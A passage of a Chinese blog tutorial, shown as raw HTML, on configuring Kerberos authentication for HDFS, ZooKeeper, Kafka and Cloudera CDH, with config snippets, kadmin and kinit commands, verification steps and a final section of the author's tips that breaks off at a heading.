&lt;value&gt;/etc/hadoop/conf/hdfs.keytab&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.journalnode.kerberos.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;hdfs/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.journalnode.kerberos.internal.spnego.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTP/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>如果配置了WebHDFS，则添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.webhdfs.enabled&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.web.authentication.kerberos.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTP/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.web.authentication.kerberos.keytab&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;/etc/hadoop/conf/hdfs.keytab&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>配置中需要注意的点：</p><p>1.<code>dfs.datanode.address</code>表示<code>data transceiver RPC server</code>所绑定的<code>hostname</code>或IP地址，如果开启 security，端口号必须小于 1024(privileged port)，否则的话启动 datanode 时候会报 <code>Cannot start secure cluster without privileged resources</code> 错误。</p><p>2.<code>principal</code> 中的 <code>instance</code> 部分可以使用 _HOST 标记，系统会自动替换它为全称域名。</p><p>3.如果开启了 <code>security, hadoop</code> 会对 <code>hdfs block data</code>(由 dfs.data.dir 指定)做 <code>permission check</code>，方式用户的代码不是调用<code>hdfs api</code>而是直接本地读<code>block data</code>，这样就绕过了<code>kerberos</code>和文件权限验证，管理员可以通过设置 <code>dfs.datanode.data.dir.perm</code> 来修改 <code>datanode</code> 文件权限，这里我们设置为700</p><p>CDH的权限管理（<a href="https://www.cloudera.com/documentation/enterprise/6/latest/topics/cm_sg_s1_install_cm_cdh.html" target="_blank" rel="noopener">来自cloudera官网</a>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hdfs：NameNode, DataNodes, and Secondary NameNode</span><br><span class="line">mapred：JobTracker and TaskTrackers (MR1) and Job History Server (YARN)</span><br><span class="line">yarn：ResourceManager and NodeManagers (YARN)</span><br><span class="line">oozie：Oozie Server</span><br><span class="line">hue：Hue Server, Beeswax Server, Authorization Manager, and Job Designer</span><br></pre></td></tr></table></figure><p>目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dfs.name.dir/ hdfs:hadoop</span><br><span class="line">dfs.data.dir/ hdfs:hadoop</span><br><span class="line">mapred.local.dir/ mapred:hadoop</span><br><span class="line">mapred.system.dir in HDFS/ mapred:hadoop</span><br><span class="line">yarn.nodemanager.local-dirs/ yarn:yarn</span><br><span class="line">yarn.nodemanager.log-dirs/ yarn:yarn</span><br><span class="line">oozie.service.StoreService.jdbc.url (if using Derby)/ oozie:oozie</span><br><span class="line">[[database]] name/ hue:hue</span><br><span class="line">javax.jdo.option.ConnectionURL/ hue:hue</span><br></pre></td></tr></table></figure><p>启动NameNode</p><p>启动之前必须确保JCE jar已经替换，首先检查JSVC</p><p>首先master节点查看是否安装了JSVC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /usr/lib/bigtop-utils/</span><br><span class="line">bigtop-detect-classpath  bigtop-detect-javahome  bigtop-detect-javalibs  jsvc</span><br></pre></td></tr></table></figure><p>然后编辑<code>/etc/default/hadoop-hdfs-datanode</code>，取消对下面注释并添加一行JSVC_HOME，修改如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export HADOOP_SECURE_DN_USER=hdfs</span><br><span class="line">export HADOOP_SECURE_DN_PID_DIR=/var/run/hadoop-hdfs</span><br><span class="line">export HADOOP_SECURE_DN_LOG_DIR=/var/log/hadoop-hdfs</span><br><span class="line">export JSVC_HOME=/usr/lib/bigtop-utils</span><br></pre></td></tr></table></figure><p>hadoop-hdfs-datanode同步到其他节点</p><p>随后分别在CDH2、CDH3获取ticket然后启动服务</p><p>#root为root/admin密码</p><p><code>kinit -k -t /etc/hadoop/conf/hdfs.keytab hdfs/master@JIMI.COM; service hadoop-hdfs-datanode start</code></p><p>（这仅仅为master节点上的操作，别的节点类似）</p><p>观察master上的Namenode日志，出现下面的日志表名Datanode启动成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">14/11/04 17:21:41 INFO security.UserGroupInformation:</span><br><span class="line">Login successful for user hdfs/cdh2@JAVACHEN.COM using keytab file /etc/hadoop/conf/hdfs.keytab</span><br></pre></td></tr></table></figure><p>Tips:</p><ul><li><p>配置 hosts，hostname 请使用小写</p></li><li><p>确保 kerberos 客户端和服务端连通</p></li><li><p>替换 JRE 自带的 JCE jar 包</p></li><li><p>为 DataNode 设置运行用户并配置 JSVC_HOME</p></li><li><p>启动服务前，先获取 ticket 再运行相关命令</p></li></ul><p>Quote:</p><p><a href="https://www.cloudera.com/documentation/enterprise/5-12-x/topics/cdh_sg_kerberos_prin_keytab_deploy.html" target="_blank" rel="noopener">CDH官方文档对Kerberos的介绍1</a></p><p><a href="https://blog.cloudera.com/blog/2015/03/how-to-quickly-configure-kerberos-for-your-apache-hadoop-cluster/" target="_blank" rel="noopener">CDH官方文档对Kerberos的介绍2</a></p><p><a href="http://web.mit.edu/~kerberos/krb5-devel/doc/admin/conf_files/krb5_conf.html" target="_blank" rel="noopener">MIT官网的文档</a></p><p><a href="https://docs.oracle.com/cd/E24847_01/html/819-7061/setup-9.html" target="_blank" rel="noopener">Oracle官网对Kerberos的介绍</a></p><hr><h3 id="5-Apach-原生Zookeeper的Kerberos配置及其验证"><a href="#5-Apach-原生Zookeeper的Kerberos配置及其验证" class="headerlink" title="5.Apach 原生Zookeeper的Kerberos配置及其验证"></a>5.Apach 原生Zookeeper的Kerberos配置及其验证</h3><p>Zookeeper的配置分为两个步骤，先配置<code>Server</code>的<code>keytab</code>，再配置<code>Client</code>的<code>keytab</code>,如果<code>zookeeper-client</code> 和 <code>zookeeper-server</code> 安装在同一个节点上，则 <code>java.env</code> 中的 <code>java.security.auth.login.config</code> 参数会被覆盖，这一点从<code>zookeeper-client</code> 命令启动日志可以看出来。</p><p>首先是配置 <code>Zk Server</code></p><p>因为KDC已经配置了，所以KDC不用再配</p><p>第一步直接生成Keytab</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cd /var/kerberos/krb5kdc/</span><br><span class="line">kadmin.local -q "addprinc -randkey zookeeper/master@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey zookeeper/datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey zookeeper/datanode1@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zookeeper.keytab  zookeeper/master@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zookeeper.keytab  zookeeper/datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zookeeper.keytab  zookeeper/datanode1@JIMI.COM "</span><br></pre></td></tr></table></figure><p>将Keytab拷贝到目录<code>/etc/zookeeper/conf</code></p><p>在三个节点上分别执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/zookeeper/conf/;chown zookeeper:hadoop zookeeper.keytab ;chmod 400 *.keytab</span><br></pre></td></tr></table></figure><p>目的是为了控制权限。</p><p>然后修改配置文件</p><p>在三个节点上的zoo.cfg文件中添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">authProvider.1=org.apache.zookeeper.server.auth.SASLAuthenticationProvider jaasLoginRenew=3600000</span><br></pre></td></tr></table></figure><p>然后创建JAAS配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Server &#123;</span><br><span class="line">  com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">  useKeyTab=true</span><br><span class="line">  keyTab="/etc/zookeeper/conf/zookeeper.keytab"</span><br><span class="line">  storeKey=true</span><br><span class="line">  useTicketCache=false</span><br><span class="line">  principal="zookeeper/master@JIMI.COM";</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>三个节点都要有，每个节点里面的principal有点不同</p><p>然后是配置<strong>Zookeeper Client</strong></p><p>还是先生成<code>keytab</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cd /var/kerberos/krb5kdc/</span><br><span class="line">kadmin.local -q "addprinc -randkey zkcli/master@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey zkcli/datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey zkcli/datanode1@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zkcli.keytab  zkcli/master@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zkcli.keytab  zkcli/datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zkcli.keytab  zkcli/datanode1@JIMI.COM "</span><br></pre></td></tr></table></figure><p>拷贝 zkcli.keytab 文件到其他节点的 <code>/etc/zookeeper/conf</code> 目录，并设置权限，分别在master、datanode0、datanode1 上执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/zookeeper/conf/;</span><br><span class="line">chown zookeeper:</span><br><span class="line">hadoop zkcli.keytab ;chmod 400 *.keytab</span><br></pre></td></tr></table></figure><p>由于 <code>keytab</code> 相当于有了永久凭证，不需要提供密码(如果修改 <code>kdc</code> 中的 <code>principal</code> 的密码，则该 <code>keytab</code> 就会失效)，所以其他用户如果对该文件有读权限，就可以冒充 <code>keytab</code> 中指定的用户身份访问 <code>hadoop</code>，所以 <code>keytab</code> 文件需要确保只对 <code>owner</code> 有读权限(0400)</p><p>创建 JAAS 配置文件</p><p>在<code>/etc/zookeeper/conf/</code>创建<code>client-jaas.conf</code>文件，内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Client &#123;</span><br><span class="line">  com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">  useKeyTab=true</span><br><span class="line">  keyTab=&quot;/etc/zookeeper/conf/zkcli.keytab&quot;</span><br><span class="line">  storeKey=true</span><br><span class="line">  useTicketCache=false</span><br><span class="line">  principal=&quot;zkcli@JIMI.COM&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>同步到其他节点，然后在<code>/etc/zookeeper/conf/</code>目录创建或者修改<code>java.env</code>，内容如下</p><p><code>export CLIENT_JVMFLAGS=&quot;-Djava.security.auth.login.config=/etc/zookeeper/conf/client-jaas.conf&quot;</code></p><p>并且同步到别的节点上</p><p>接着是验证：</p><p>启动客户端：<code>zookeeper-client -server master:2181</code></p><p>创建一个<code>znode</code>节点：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[zk: master:2181(CONNECTED) 0] create /znode1 sasl:zkcli@JIMI.COM:cdwra</span><br><span class="line">Created /znode1</span><br></pre></td></tr></table></figure><p>验证该节点是否创建以及其ACL：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[zk: master:2181(CONNECTED) 1] getAcl /znode1</span><br><span class="line">    'world,'anyone</span><br><span class="line">    : cdrwa</span><br></pre></td></tr></table></figure><p>只要能够在一个节点上创建<code>znode</code>，在别的节点上能够显示出来，就说明<code>Zookeeper</code>的<code>kerberos</code>已经配置成功。</p><hr><h3 id="6-Apach原生Kafka的Kerberos配置及其验证"><a href="#6-Apach原生Kafka的Kerberos配置及其验证" class="headerlink" title="6.Apach原生Kafka的Kerberos配置及其验证"></a>6.Apach原生Kafka的Kerberos配置及其验证</h3><p>因为之前的操作已经搭建完了<code>KDC</code>，所以省略了自建<code>Kerberos</code>的步骤</p><p>首先还是为<code>broker</code>每台服务器在<code>Kerberos</code>服务器生成相应的<code>principal</code>和<code>Keytab</code>，将下列命令里生成的<code>kafka.keytab</code>文件分发到对应<code>broker</code>机器的统一位置，比如<code>/etc/kafka.keytab</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">addprinc -randkey kafka/kafkahost1@EXAMPLE.COM</span><br><span class="line">addprinc -randkey kafka/kafkahost2@EXAMPLE.COM</span><br><span class="line">addprinc -randkey kafka/kafkahost3@EXAMPLE.COM</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">xst -norandkey -k /opt/kafkahost1/kafka.keytab kafka/kafkahost1@EXAMPLE.COM</span><br><span class="line">xst -norandkey -k /opt/kafkahost2/kafka.keytab kafka/kafkahost2@EXAMPLE.COM</span><br><span class="line">xst -norandkey -k /opt/kafkahost3/kafka.keytab kafka/kafkahost3@EXAMPLE.COM</span><br></pre></td></tr></table></figure><p>配置kafka server文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">listeners=SASL_PLAINTEXT://:9092</span><br><span class="line">security.inter.broker.protocol=SASL_PLAINTEXT</span><br><span class="line">sasl.mechanism.inter.broker.protocol=GSSAPI</span><br><span class="line">sasl.enabled.mechanisms=GSSAPI</span><br><span class="line">sasl.kerberos.service.name=kafka</span><br><span class="line">super.users=User:kafka</span><br><span class="line">authorizer.class.name=kafka.security.auth.SimpleAclAuthorizer</span><br></pre></td></tr></table></figure><p>KafkaClient模块是为了bin目录下kafka-console-consumer.sh之类的脚本使用的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">KafkaServer &#123;</span><br><span class="line">            com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">            useKeyTab=true</span><br><span class="line">            storeKey=true</span><br><span class="line">            keyTab="/etc/kafka.keytab"</span><br><span class="line">            principal="kafka/kafkahost1@EXAMPLE.COM";</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">KafkaClient &#123;</span><br><span class="line">        com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">        useKeyTab=true</span><br><span class="line">        storeKey=true</span><br><span class="line">        keyTab="/etc/kafka.keytab"</span><br><span class="line">        principal="kafka/kafkahost1@EXAMPLE.COM"</span><br><span class="line">        useTicketCache=true;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>修改bin目录下kafka-run-class.sh，在  exec $JAVA 后面增加kerberos启动参数,然后就可以用正常的脚本启动服务了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.krb5.conf=/etc/krb5.conf -Djava.security.auth.login.config=/opt/kafka/config/kafka_server_jaas.conf</span><br></pre></td></tr></table></figure><p>或者用这个脚本启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">export KAFKA_HEAP_OPTS='-Xmx256M'</span><br><span class="line">export KAFKA_OPTS='-Djava.security.krb5.conf=/etc/krb5.conf -Djava.security.auth.login.confi</span><br><span class="line">g=/etc/kafka/zookeeper_jaas.conf'</span><br><span class="line">bin/zookeeper-server-start.sh config/zookeeper.properties &amp;</span><br><span class="line"></span><br><span class="line">sleep 5</span><br><span class="line"></span><br><span class="line">export KAFKA_OPTS='-Djava.security.krb5.conf=/etc/krb5.conf -Djava.security.auth.login.confi</span><br><span class="line">g=/etc/kafka/kafka_server_jaas.conf'</span><br><span class="line">bin/kafka-server-start.sh config/server.properties</span><br></pre></td></tr></table></figure><p>最终的目的都是一样</p><p>客户端脚本使用</p><p>启用kerberos后，部分kafka管理脚本需要增加额外的参数才能使用</p><p>首先建立配置文件<code>client.properties</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">security.protocol=SASL_PLAINTEXT</span><br><span class="line">sasl.kerberos.service.name=kafka</span><br><span class="line">sasl.mechanism=GSSAPI</span><br></pre></td></tr></table></figure><p>涉及到的zookeeper.properties</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">authProvider.1=org.apache.zookeeper.server.auth.SASLAuthenticationProvider</span><br><span class="line">requireClientAuthScheme=sasl</span><br><span class="line">jaasLoginRenew=3600000</span><br></pre></td></tr></table></figure><p>所以新命令的使用方式为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-consumer-groups.sh --bootstrap-server kafkahost1:9092 --list --command-config client.properties</span><br><span class="line">bin/kafka-console-producer.sh --broker-list kafkahost1:9092 --topic test --producer.config client.properties</span><br><span class="line">bin/kafka-console-consumer.sh --bootstrap-server kafkahost1:9092 --topic test --consumer.config client.properties</span><br></pre></td></tr></table></figure><p>如果之前JCE的包没有安装好的话会报如下错误，需要把JCE包安装到位即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WARN [Controller-60-to-broker-60-send-thread], Controller 60's connection to broker kafka60:9092 (id: 60 rack: null) was unsuccessful (kafka.controller.RequestSendThread)</span><br><span class="line">java.io.IOException: Connection to kafka60:9092 (id: 60 rack: null) failed</span><br></pre></td></tr></table></figure><p>能在命令行上运行成功命令行消费者和命令行生产者就说明ZK和Kafka的安装基本搞定，没有问题。</p><p>用Java连接集群上的Kerberos组件篇幅较长，涉及代码，另外开一篇文章说明。</p><hr><h3 id="7-Cloudera’s-Distribution-Including-Apache-Hadoop-CDH-上Kerberos的安装"><a href="#7-Cloudera’s-Distribution-Including-Apache-Hadoop-CDH-上Kerberos的安装" class="headerlink" title="7.Cloudera’s Distribution Including Apache Hadoop(CDH)上Kerberos的安装"></a>7.Cloudera’s Distribution Including Apache Hadoop(<em>CDH</em>)上Kerberos的安装</h3><p>CDH上面的Kerberos安装其实已经被简化了，简化的好处是安装方便，坏处是一旦出现问题不知从何处下手。所以对前面单独组件的了解是有必要的。实际操作下来，官网和各技术博客都有些许问题。在此记录。</p><p>首先配置KDC，和单独安装操作相同</p><p>首先KDC还是要配置，在CM服务器上配置KDC</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install krb5-serverkrb5-libs krb5-auth-dialog krb5-workstation</span><br></pre></td></tr></table></figure><p>修改<code>/etc/krb5.conf</code>、<code>/var/kerberos/krb5kdc/kadm5.acl</code>、<code>/var/kerberos/krb5kdc/kdc.conf</code>配置，配置内容相同，不再赘述。</p><p>然后在所有节点上（包括CM）安装Kerberos客户端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install krb5-libs krb5-workstation</span><br></pre></td></tr></table></figure><p>然后在CM节点上独立安装额外的包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install openldap-clients</span><br></pre></td></tr></table></figure><p>分发krb5.conf到另外两个节点</p><p>JCE包还是要记得替换，替换位置：<code>/usr/share/java/jdk1.8.0_144/jre/lib/security</code></p><p>KDC安装完成后，建立测试Kerberos的管理员账号。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5k45t4jj20et03u3yg.jpg" alt="alt admin"></p><hr><p>CM界面 -&gt;管理 -&gt; 安全</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5rgh6faj20o702ut8o.jpg" alt="CDH"></p><p>点击启用</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0ar5zj20pe0o43zp.jpg" alt="CDH1"></p><p>全部勾选即可</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0a7vuj20n00pmt9i.jpg" alt></p><p>这边别的都好理解，都是和host上面对应的，然后这个加密类型是和krb5.conf对应相同的</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v08hypj20k005dgll.jpg" alt></p><p>这上面有张图没截到，是选择是否要通过CM管理的，一般选择不通过</p><p>这边管理账户输入之前创建的管理账户即可。</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0a1fxj20hz05d0ss.jpg" alt></p><p>这边CDH会帮助验证密码</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0ayqyj20mx0oamxv.jpg" alt></p><p>接下来的这个步骤我标红了一块，我在这边spark2的部分，服务范围设置的是spark2，默认是spark，我修改了一下，避免以后的keytab名字出现歧义</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0e6e7j20oc0q1wfz.jpg" alt></p><p>随后，直接勾选重启选项即可</p><p>初步的配置就完成了</p><hr><p><a href="https://docs.huihoo.com/solaris/10/simplified-chinese/html/819-7061/aadmin-3.html#setup-304" target="_blank" rel="noopener">Oracle系统管理指南：安全性服务文档</a></p><p>（包括了备份和传播Kerberos、如何恢复Kerberos、如何在服务器升级后转换Kerberos数据库，如何重新配置主KDC服务器以使用增量传播，如何重新配置从KDC以使用增量传播，如何配置从 KDC 服务器以使用完全传播，如何验证KDC服务器已经同步，如何手动将Kerberos数据库传播到从KDC服务器，设计并行传播，设置并行传播的配置步骤，管理存储文件，如何删除存储文件等。）</p><hr><h3 id="8-对Kerberos的一点使用心得"><a href="#8-对Kerberos的一点使用心得" class="headerlink" title="8.对Kerberos的一点使用心得"></a>8.对Kerberos的一点使用心得</h3><p>CDH的Kerberos其实算是相对好管理的，最起码组件的principal都是CDH自动生成的。</p><p>在KDC上创建完成管理员开启功能之后，我常用的操作有这些：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 登录，通过创建的BDB管理账号管理</span><br><span class="line">kadmin.local</span><br><span class="line"><span class="meta">#</span> 查看现有的账号列表</span><br><span class="line">kadmin.local: listprincs</span><br><span class="line"><span class="meta">#</span> 这边CDH的Principal都是自动生成的，可以直接使用，在服务器上的文件夹里找到对应Keytab就可以登录</span><br><span class="line"><span class="meta">#</span> 找到Principal之后，可以查看Keytab的加密方式 过期时间等等</span><br><span class="line">klist -kt /root/hdfs.keytab</span><br><span class="line">Keytab name: FILE:/root/hdfs.keytab</span><br><span class="line">KVNO Timestamp           Principal</span><br><span class="line">---- ------------------- ------------------------------------------------------</span><br><span class="line">  13 07/03/2018 10:08:10 hdfs/master126@JIMI.COM</span><br><span class="line">  13 07/03/2018 10:08:10 hdfs/master126@JIMI.COM</span><br><span class="line">  13 07/03/2018 10:08:10 hdfs/master126@JIMI.COM</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> Keytab的作用就是获取KDC的ticket</span><br><span class="line">kinit -kt keytab/hdfs.keytab hdfs/master126@JIMI.COM</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 还可以使用klist -e查看现在服务器里缓存的是哪一个ticket</span><br><span class="line">klist -e</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_0</span><br><span class="line">Default principal: hdfs/bigdata25@ZQYKJ.COM</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">07/06/2018 11:24:46  07/07/2018 11:24:46  krbtgt/ZQYKJ.COM@ZQYKJ.COM</span><br><span class="line">renew until 07/11/2018 11:24:46, Etype (skey, tkt): aes128-cts-hmac-sha1-96, aes128-cts-hmac-sha1-96 </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 退出</span><br><span class="line">kdestroy</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 这边还拓展一个很实用的功能 keytab维护工具 ktutil</span><br><span class="line">ktutil</span><br><span class="line"><span class="meta">#</span> 打开之后即进入工具，工具里面我常用的功能包括：rkt（read keytab）</span><br><span class="line"><span class="meta">#</span> 可以将keytab读进来之后然后，生成新的keytab（合并）</span><br><span class="line"><span class="meta">#</span> 然后上面提到的read完成之后，也可以列出 分析 加密方式等等</span><br></pre></td></tr></table></figure><p><a href="https://www.freebsd.org/cgi/man.cgi?query=ktutil" target="_blank" rel="noopener">更多ktutilAPI</a></p><p><a href="https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_71/com.ibm.aix.cmds3/klist.htm" target="_blank" rel="noopener">IBM对BDB数据库命令的介绍</a></p><hr><h3 id="9-如何验证Kerberos已经安装完成"><a href="#9-如何验证Kerberos已经安装完成" class="headerlink" title="9.如何验证Kerberos已经安装完成"></a>9.如何验证Kerberos已经安装完成</h3><p><strong>HDFS</strong><br>登录到某一个节点后，切换到hdfs用户，然后用kinit来获取credentials</p><p>现在用<code>hadoop hdfs -ls /</code>应该能正常输出结果<br>用kdestroy销毁credentials后，再使用<code>hadoop hdfs -ls /</code>会发现报错</p><p><strong>Kafka</strong></p><p>用新的一套API，消费者能正常消费，生产者能正常生产不报错误就算ok</p><p>注意：是新API，开启Kerberos之后老API无法再使用</p><p><strong>Zookeeper</strong></p><p>启动zookeeper：</p><p>Zookeeper-client -server master:2181</p><p>创建一个 znode 节点：</p><p>create /znode1 sasl:<a href="mailto:master@JIMI.com" target="_blank" rel="noopener">master@JIMI.com</a>:cdwra</p><p>在另外的节点上执行 </p><p>getAcl /znode1</p><p>如果能够获取在另外一个节点上输入的输入就证明没有问题</p><hr><h3 id="10-Kerberos遇到的坑"><a href="#10-Kerberos遇到的坑" class="headerlink" title="10.Kerberos遇到的坑"></a>10.Kerberos遇到的坑</h3><h4 